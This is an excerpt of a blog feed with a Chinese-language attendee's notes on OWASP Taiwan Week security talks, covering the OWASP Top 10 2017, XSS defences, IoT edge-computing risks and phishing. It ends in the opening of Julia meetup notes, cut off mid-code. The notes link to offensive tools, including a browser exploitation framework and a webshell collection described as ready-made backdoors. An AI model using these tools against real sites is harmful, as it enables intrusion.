&lt;li&gt;&lt;a href="https://github.com/OWASP/Top10/blob/master/2017/OWASP%20Top%2010%202017%20GM%20(en).pdf"&gt;OWASP Top 10 2017 Golden Master&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;OWASP 發展趨勢 - 蔡一郎&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;簡介  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://owasp.org"&gt;https://owasp.org&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;OWASP Taiwan 創立約莫 7~8 年，但之前都是被認定為不活躍的社群。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Category:OWASP_CTF_Project"&gt;OWASP CTF&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/OWASP/Top10"&gt;OWASP Top 10&lt;/a&gt; 都有告訴你要如何檢測網站是否有該漏洞。  &lt;/li&gt;
&lt;li&gt;志工性質、無給薪，好處是志工可以優先參加活動。  &lt;/li&gt;
&lt;li&gt;Research and Development  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project"&gt;Top 10&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project"&gt;Zed Attack Proxy (ZAP)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project"&gt;WebGoat&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OWASP Taiwan Week 今年是第一次辦。  &lt;/li&gt;
&lt;li&gt;每年 7 月會有個較大型的會議。(OWASP Taiwan Day)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OWASP 旗艦計劃 (OWASP Flagship Projects)  &lt;ul&gt;
&lt;li&gt;Tools  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project"&gt;OWASP Zed Attack Proxy (ZAP)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/OWASP_Web_Testing_Environment_Project"&gt;OWASP Web Testing Environment Project&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/OWASP_OWTF"&gt;OWASP OWTF&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/OWASP_Dependency_Check"&gt;OWASP Dependency Check&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Code  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project"&gt;OWASP ModSecurity Core Rule Set Project&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Category:OWASP_CSRFGuard_Project"&gt;OWASP CSRFGuard Project&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jtmelton/appsensor"&gt;OWASP AppSensor Project Reference&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Documentation  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project"&gt;OWASP Application Security Verification Standard Project&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/OWASP_SAMM_Project"&gt;OWASP Software Assurance Maturity Model (SAMM)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/OWASP/samm"&gt;https://github.com/OWASP/samm&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/File:Owasp-appsensor-guide-v2.pdf"&gt;OWASP AppSensor Project Guide&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project"&gt;OWASP Top 10 Project&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents"&gt;OWASP Testing Guide Project&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;建議先從 Flagship Projects 開始看，因為這是很多人吵架的結果。XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;OWASP Top 10 2017 - Henry Hu&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;General introduction to OWASP Top 10  &lt;ul&gt;
&lt;li&gt;first released in 2003  &lt;/li&gt;
&lt;li&gt;flagship project  &lt;/li&gt;
&lt;li&gt;2004, 2007, 2010, 2013, 2017  &lt;/li&gt;
&lt;li&gt;a list of the 10 most critical web application security risks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2017 Timeline  &lt;ul&gt;
&lt;li&gt;07/31: Call for Data Open  &lt;/li&gt;
&lt;li&gt;10/09: RC2  &lt;/li&gt;
&lt;li&gt;11/20: Released  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How is OWASP Top 10 generated?  &lt;ul&gt;
&lt;li&gt;Data proven  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web App by Language in survey  &lt;ul&gt;
&lt;li&gt;Java: 54%  &lt;/li&gt;
&lt;li&gt;.NET: 32%  &lt;/li&gt;
&lt;li&gt;JavaScript 快速成長  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Vunlnerability Assessments - HAT vs TAH  &lt;ul&gt;
&lt;li&gt;Human-Augmented Tools (HAT)  &lt;ul&gt;
&lt;li&gt;人去調整工具之後用工具去做掃描  &lt;/li&gt;
&lt;li&gt;很多現有的工具都是 foucs 在 XSS，所以掃出來的結果以 XSS 居多。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tool-Augmented Humans (TAH)  &lt;ul&gt;
&lt;li&gt;以人為主去使用工具來做掃描  &lt;/li&gt;
&lt;li&gt;發現的漏洞就比較多樣化。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Top_10_2017-Release_Notes"&gt;2017 RC1 Changed&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;merged 2013-A4: Insecure Direct Object References and 2013-A7: Missing Function Level Access Control back into 2017-A4: Broken Access Control.  &lt;/li&gt;
&lt;li&gt;added 2017-A7: Insufficient Attack Protection  &lt;/li&gt;
&lt;li&gt;added 2017-A10: Underprotected APIs  &lt;/li&gt;
&lt;li&gt;dropped: 2013-A10: Unvalidated Redirects and Forwards  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/OWASP/Top10/blob/master/2017/OWASP%20Top%2010%202017%20GM%20(en).pdf"&gt;2017 Golden Master Changed&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;ADDED  &lt;ul&gt;
&lt;li&gt;A4:2017-XML External Entities (XXE) is a new category primarily supported by source code analysis security testing tools (SAST: Static Application Security Testing tools) data sets.  &lt;/li&gt;
&lt;li&gt;A8:2017-Insecure Deserialization, which permits remote code execution or sensitive object manipulation on affected platforms.  &lt;ul&gt;
&lt;li&gt;Responsible for one of the worst breaches of all time.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A10:2017-Insufficient Logging and Monitoring, the lack of which can prevent or significantly delay malicious activity and breach detection, incident response, and digital forensics.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MERGED  &lt;ul&gt;
&lt;li&gt;A4-Insecure Direct Object References and A7-Missing Function Level Access Control merged into A5:2017-Broken Access Control.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RETIRED  &lt;ul&gt;
&lt;li&gt;A8-Cross-Site Request Forgery (CSRF), Frameworks commonly include CSRF defenses, with &amp;lt; 5% of all apps, now #13.  &lt;/li&gt;
&lt;li&gt;A10-Unvalidated Redirects and Forwards, less than 1% of the data set supports this issue today, now #25.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The Significant of Top 10 2017  &lt;ul&gt;
&lt;li&gt;Web front-end  &lt;ul&gt;
&lt;li&gt;Single page application (SPA) wriiten in JS allows the creation of highly modular front end UI/UX  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web back-end  &lt;ul&gt;
&lt;li&gt;Microservices written in node.js is now the primary interface for legacy application through API and RESTful web services.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/OWASP/Top10/blob/master/2017/en/0xa4-xxe.md"&gt;A4:2017-XML External Entities (XXE)&lt;/a&gt; explained  &lt;ul&gt;
&lt;li&gt;尤其微軟的 IIS server 的 XML Processor 的設定最有可能有問題  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Billion_laughs_attack"&gt;Billion laughs attack&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/OWASP/Top10/blob/master/2017/en/0xa8-insecure-deserialization.md"&gt;A8:2017 Insecure Deserialization&lt;/a&gt; explained  &lt;ul&gt;
&lt;li&gt;這次制定的過程中其中一個吵架吵的滿兇的一個  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/OWASP/Top10/blob/master/2017/en/0xaa-logging-detection-response.md"&gt;A10:2017 Insufficient Logging and Monitoring&lt;/a&gt; explained  &lt;ul&gt;
&lt;li&gt;不是只有 web server 而已，應該要把所有的 server log 都納入管轄範圍。  &lt;/li&gt;
&lt;li&gt;大部份的 breach 被發現時潛伏期已經拉長到 200 天前的事了，目前很少人會去看到 200 天前的 log，所以這是新的需要去注意的事。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Moving on...  &lt;ul&gt;
&lt;li&gt;除了 Top 10 以外，其實有列出總共 50 個 issues，但事實上當然有更多的安全漏洞。  &lt;/li&gt;
&lt;li&gt;請不要只看 OWASP Top 10，它不是一切，也不是聖經，在開發網站的時候還要注意更多的安全問題。  &lt;/li&gt;
&lt;li&gt;希望各位可以多多參與 OWASP 的社群，因為很缺人。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Client Side Security and Testing Tools - David Cervigni&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;JS Security, topics:  &lt;ul&gt;
&lt;li&gt;Evolution of client technologies  &lt;/li&gt;
&lt;li&gt;Why is always more important  &lt;/li&gt;
&lt;li&gt;Why is always more difficult  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Client security is vast  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Client_Side_Testing"&gt;https://www.owasp.org/index.php/Client_Side_Testing&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;XSS  &lt;ul&gt;
&lt;li&gt;XSS is always dangerous  &lt;ul&gt;
&lt;li&gt;consequences  &lt;ul&gt;
&lt;li&gt;XSRF protection bypass  &lt;/li&gt;
&lt;li&gt;Cookies / session stealing  &lt;/li&gt;
&lt;li&gt;Defacement  &lt;/li&gt;
&lt;li&gt;Password / credential stealing  &lt;/li&gt;
&lt;li&gt;Enumeration  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Anti XSS approaches  &lt;ul&gt;
&lt;li&gt;Classic  &lt;ul&gt;
&lt;li&gt;Validation  &lt;/li&gt;
&lt;li&gt;Filtering  &lt;/li&gt;
&lt;li&gt;HTML Encoding  &lt;/li&gt;
&lt;li&gt;Encoding lib + Contextual encoding  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Requires  &lt;ul&gt;
&lt;li&gt;Secure coding standards (enforced!)  &lt;/li&gt;
&lt;li&gt;Knowledge  &lt;/li&gt;
&lt;li&gt;Design (use the right libs)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Anti XSS evolution  &lt;ul&gt;
&lt;li&gt;Contextual encoding templates  &lt;ul&gt;
&lt;li&gt;Very strict  &lt;ul&gt;
&lt;li&gt;Hard to encode in nested contexts. (double encoding)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mitigations  &lt;ul&gt;
&lt;li&gt;CPC: Content Security Policy  &lt;/li&gt;
&lt;li&gt;ECMAScript security features (e.g. strict mode)  &lt;/li&gt;
&lt;li&gt;Sandboxing JS (Google CAJA, sanitizer libraries)  &lt;/li&gt;
&lt;li&gt;Anti XSS browser features WAF  &lt;/li&gt;
&lt;li&gt;Requires  &lt;ul&gt;
&lt;li&gt;Secure Application Design  &lt;/li&gt;
&lt;li&gt;Third parties JS libraries compatibility  &lt;/li&gt;
&lt;li&gt;Legacy systems?  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Code Flow and Taint analysis  &lt;ul&gt;
&lt;li&gt;Sources  &lt;/li&gt;
&lt;li&gt;Filters  &lt;/li&gt;
&lt;li&gt;Sinks  &lt;/li&gt;
&lt;li&gt;投影片的字有點小，可能可以直接看&lt;a href="https://www.owasp.org/index.php/Static_Code_Analysis"&gt;這份文件&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tools for JS Code analysis  &lt;ul&gt;
&lt;li&gt;SCA, static code analysis  &lt;ul&gt;
&lt;li&gt;Heavy  &lt;/li&gt;
&lt;li&gt;Difficult  &lt;/li&gt;
&lt;li&gt;Lower accuracy (false positive)  &lt;/li&gt;
&lt;li&gt;Adaptability (false negatives... needs custom rules)  &lt;/li&gt;
&lt;li&gt;Broad language support  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dynamic code analysis  &lt;ul&gt;
&lt;li&gt;Requires instrumentation  &lt;/li&gt;
&lt;li&gt;More accurate  &lt;/li&gt;
&lt;li&gt;Fuzzing capabilities  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Integrated them into SDLC (systems development life cycle) and Automation (CI)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;當萬物相遇電信網路：一探邊緣運算的資安議題與解決方案 - 王騰嶽&lt;/h2&gt;
&lt;p&gt;這個 talk 介紹挺有意思的，&lt;br /&gt;
講了滿多跟電信網路相關的東西，&lt;br /&gt;
平常真的比較少接觸到。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/LPWAN"&gt;LPWAN (Low Power WAN)&lt;/a&gt; 與其他 Wireless 技術  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/NarrowBand_IOT"&gt;NB-IoT&lt;/a&gt; 是 3GPP 標準的窄帶蜂窩物聯網技術，也是 5G 時代一項重要的實體連結技術。  &lt;ul&gt;
&lt;li&gt;NB-IoT 只是 3GPP 技術中的一環。  &lt;/li&gt;
&lt;li&gt;使用專屬的頻譜，必須要花費。但未來不會有爭奪 NB-IoT 頻譜的問題，因為可以直接使用在電信公司現有的電信網路上。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;LPWAN: NB-IoT, LoRa, sigfox, LTE-M, genu, eightless, waviot  &lt;ul&gt;
&lt;li&gt;使用開放頻譜，不需要購買，所以品質也就無法保證，但價格會較便宜。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bluetooth 的限制是不夠遠。  &lt;/li&gt;
&lt;li&gt;功耗比 ZigBee 還要低，Range 比 3G/4G/5G 還要遠。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NB-IoT 與電信網路架構  &lt;ul&gt;
&lt;li&gt;UE, LTE-Uu (NB-IoT 只有在這段）, eNB, GTP-U (S1-U), S-GW, P-GW, Internet  &lt;/li&gt;
&lt;li&gt;Physical Interface (Last Mile), Backhual, EPC（核心網路）  &lt;/li&gt;
&lt;li&gt;GTP 的世界：GPRS Tunnel 包覆 IP 封包  &lt;/li&gt;
&lt;li&gt;所以使用 NB-IoT 只會在 UE （手機） 和 eNB （基地台） 這段而已  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mobile Edge Computing (MEC)  &lt;ul&gt;
&lt;li&gt;Mobile Edge  &lt;ul&gt;
&lt;li&gt;電信行動網的邊緣（核心網路與基地台之間）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IoT 為何需要搭配 MEC  &lt;ul&gt;
&lt;li&gt;如果 device 不太需要上 Facebook / LINE / YouTube  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MEC Case  &lt;ul&gt;
&lt;li&gt;車聯網  &lt;/li&gt;
&lt;li&gt;Cache  &lt;ul&gt;
&lt;li&gt;Content cache 有困難，因為加密太多。  &lt;/li&gt;
&lt;li&gt;但 DNS 是可以做的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IoT 與 MEC 合體之後的資安疑慮  &lt;ul&gt;
&lt;li&gt;前情提要  &lt;ul&gt;
&lt;li&gt;核心網路內是沒有 IPS 或 Firewall 的  &lt;/li&gt;
&lt;li&gt;客戶的手機有被攻擊過嗎？  &lt;ul&gt;
&lt;li&gt;沒聽過  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;我們手機客戶會攻擊人？  &lt;ul&gt;
&lt;li&gt;那不關我的事...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IoT 服務的資安疑慮  &lt;ul&gt;
&lt;li&gt;如果電信商真的要提供這樣的服務的話，應該要更正視這樣的問題。  &lt;/li&gt;
&lt;li&gt;Device 於實體世界被駭，透過 MEC 作為中繼繼續傳播。  &lt;/li&gt;
&lt;li&gt;Device 運算力弱者，不太可能端點防禦，也不太可能裝防毒軟體。  &lt;/li&gt;
&lt;li&gt;在 MEC 與基地台中間安裝 Firewall 或 IPS 就收工了？  &lt;ul&gt;
&lt;li&gt;錯，因為有 Tunnel 存在，一定得請電信公司處理。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;建立 MEC 的資安機制  &lt;ul&gt;
&lt;li&gt;MEC 的平台要提供 IoT 服務進駐  &lt;/li&gt;
&lt;li&gt;MEC 內各個 IoT 服務（VM 型態）要隔離  &lt;/li&gt;
&lt;li&gt;MEC 可以直接進行黑名單 IP 過濾  &lt;/li&gt;
&lt;li&gt;MEC 要轉換 GTP &amp;lt;-&amp;gt; IP 和 GTP termination，於是 IT 產業找到了電信的突破口。  &lt;/li&gt;
&lt;li&gt;進入 IP 世界之後：NFV (Network Functions Virtualization) + SDN  &lt;ul&gt;
&lt;li&gt;VM 監控管理平台  &lt;/li&gt;
&lt;li&gt;網路安全設備  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Security Framework in MEC Platform  &lt;ul&gt;
&lt;li&gt;NFV Inftrastructure Security  &lt;/li&gt;
&lt;li&gt;Network Security  &lt;/li&gt;
&lt;li&gt;Application Authorization  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;講者認為 IoT + MEC + 資安尚未解決的問題對於軟體從業人員是個在未來有許多發展空間的舞台。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Container 與 Web 安全 - 鄭學輝&lt;/h2&gt;
&lt;p&gt;前半段有點分不清楚是在介紹 Docker 還是在講 container security...&lt;br /&gt;
個人感覺整個投影片比較偏向 Sales Kit...  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;新興應用安全技術  &lt;ul&gt;
&lt;li&gt;RUNTIME  &lt;ul&gt;
&lt;li&gt;Runtime Application Self Protection (RASP)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;INTERACTIVE  &lt;/li&gt;
&lt;li&gt;SOFTWARE  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Python as Hacking Tool - Galoget Latorre&lt;/h2&gt;
&lt;p&gt;原本以為是要現場教學，&lt;br /&gt;
但整場的狀況比較像是，&lt;br /&gt;
前半段推坑 Python，&lt;br /&gt;
後半段 Live Demo 用 Python 寫的 script 的攻擊實況，&lt;br /&gt;
然後提供一些工具供聽眾參考，&lt;br /&gt;
還是沒講要怎麼寫 XD。&lt;br /&gt;
（是說現場直接拿別人的真實個資來 Demo 真的沒問題嗎 www）  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python 簡介  &lt;/li&gt;
&lt;li&gt;基本 Google Hacking  &lt;/li&gt;
&lt;li&gt;Some tools  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/dloss/python-pentest-tools"&gt;GitHub - dloss/python-pentest-tools: Python tools for penetration testers&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/andresriancho/w3af"&gt;GitHub - andresriancho/w3af: w3af: web application attack and audit framework, the open source web vulnerability scanner.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/chinoogawa/fbht"&gt;GitHub - chinoogawa/fbht: Facebook Hacking Tool&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/IFGHou/wapiti"&gt;GitHub - IFGHou/wapiti: A web-application vulnerability scanner&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/OWASP/QRLJacking"&gt;GitHub - OWASP/QRLJacking: QRLJacking or Quick Response Code Login Jacking is a simple-but-nasty attack vector affecting all the applications that relays on “Login with QR code” feature as a secure way to login into accounts which aims for hijacking users session by attackers.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;web swc case study and cyber simulation - 何宜霖&lt;/h2&gt;
&lt;p&gt;（這場講的條理滿清楚的，但會場座位沒得充電，我的 Mac Book Air 2013 已經沒電了 Orz）  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;講了釣魚攻擊和水坑攻擊的發生情境  &lt;/li&gt;
&lt;li&gt;腳本駭客的常見攻擊手法  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/beefproject/beef"&gt;GitHub - beefproject/beef: The Browser Exploitation Framework Project&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;一些很基本的卻常常忽略的問題  &lt;ul&gt;
&lt;li&gt;裝置預設密碼沒改  &lt;/li&gt;
&lt;li&gt;放在 DMZ 東西是否會被外網輕易存取  &lt;/li&gt;
&lt;li&gt;網站測試頁面和測試帳號是否有清除  &lt;ul&gt;
&lt;li&gt;上傳檔案的測試頁面記得關掉，否則就很有可能會被人上傳後門。  &lt;/li&gt;
&lt;li&gt;網路上都有很多現成的後門可以取得了，像是 &lt;a href="https://github.com/tennc/webshell"&gt;GitHub - tennc/webshell: This is a webshell open source project&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;物聯網裝置的資安模擬環境會是未來重要的一環  &lt;ul&gt;
&lt;li&gt;電腦跟手機可能不是 24x7 連網，但物聯網裝置基本上都是 24x7 連網而且有的還要求網路的 latency 要很低，一被入侵很有可能成為非常大型的 Bot Net。（沒提到前陣子鬧很大的 Mira 病毒）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;然後講者講了一句很有趣的話  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;「社交工程一直都可以成功的原因是什麼？因為人腦的愚蠢是不能進行安全性更新的。」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;今天聽下來真的覺得滿棒的，&lt;br /&gt;
也對 OWASP 更加瞭解了，&lt;br /&gt;
一直以來都只知道 Top 10 而已，&lt;br /&gt;
今天才發現原來還有很多很好用的 Project 和文件，&lt;br /&gt;
才知道原來以前用的 DirBuster 也是 OWASP 的 project 之一。&lt;br /&gt;
打聽一下才發現原來今年 7 月就有個 OWASP Taiwan Day 了，&lt;br /&gt;
但我當時沒有見到任何宣傳消息。&lt;br /&gt;
現在自己的狀況真的就比較像拿資安當興趣而已，&lt;br /&gt;
要當飯吃的話覺得自己的技術力和學習能力都跟不上這個產業啊。  &lt;/p&gt;</summary><category term="OWASP"></category><category term="Security"></category></entry><entry><title>Julia Taiwan Meetup #10</title><link href="https://blog.m157q.tw/posts/2017/11/17/julia-taiwan-meetup-10/" rel="alternate"></link><published>2017-11-17T21:30:48+08:00</published><updated>2017-11-17T21:30:48+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-11-17:posts/2017/11/17/julia-taiwan-meetup-10/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;網址：&lt;a href="https://juliataiwan.kktix.cc/events/6e617417"&gt;https://juliataiwan.kktix.cc/events/6e617417&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;開場&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/JuliaGPU/"&gt;https://github.com/JuliaGPU/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/SimonDanisch/MakiE.jl"&gt;https://github.com/SimonDanisch/MakiE.jl&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Julia 用來增進效能的方法是直接使用 LLVM IR  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;OOP and design patterns in Julia - 杜岳華&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;對 Julia OOP system 和 multiple dispatch 的理解程度  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Multiple_dispatch"&gt;https://en.wikipedia.org/wiki/Multiple_dispatch&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Composite over inheritance  &lt;/li&gt;
&lt;li&gt;Decouple the behavior and state  &lt;ul&gt;
&lt;li&gt;先不管 behavior，而是先管 datatype  &lt;/li&gt;
&lt;li&gt;Method 不屬於某個 datatype  &lt;/li&gt;
&lt;li&gt;Julia 的 OOP 比較著重在 behavior (function) 的部份  &lt;ul&gt;
&lt;li&gt;例如以往我們可能得針對信用卡和悠遊卡分別撰寫其儲值這個動作的 function，然後要使用的時候便以 &lt;code&gt;悠遊卡.儲值()&lt;/code&gt; 或 &lt;code&gt;信用卡.儲值()&lt;/code&gt; 的方式使用，這種方式又被稱為 single dispatch。  &lt;/li&gt;
&lt;li&gt;但 Julia 則是以撰寫儲值這個 behavior 為主，使用時會變成，&lt;code&gt;儲值.悠遊卡()&lt;/code&gt; 和 &lt;code&gt;儲值.信用卡()&lt;/code&gt; 的方式使用，這種方式不同於以往習慣的 single dispatch，而是 multiple dispatch。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如何用 multiple dispatch 寫猜拳遊戲？  &lt;ul&gt;
&lt;li&gt;The beauty of multiple dispatch  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://giordano.github.io/blog/2017-11-03-rock-paper-scissors/"&gt;https://giordano.github.io/blog/2017-11-03-rock-paper-scissors/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;abstract type Shape end  

struct Rock &amp;lt;: Shane end  
struct Paper &amp;lt;: Shane end  
struct Scissors &amp;lt;: Shane end  

play(::Type{Paper}, ::Type{Rock}) = 1  
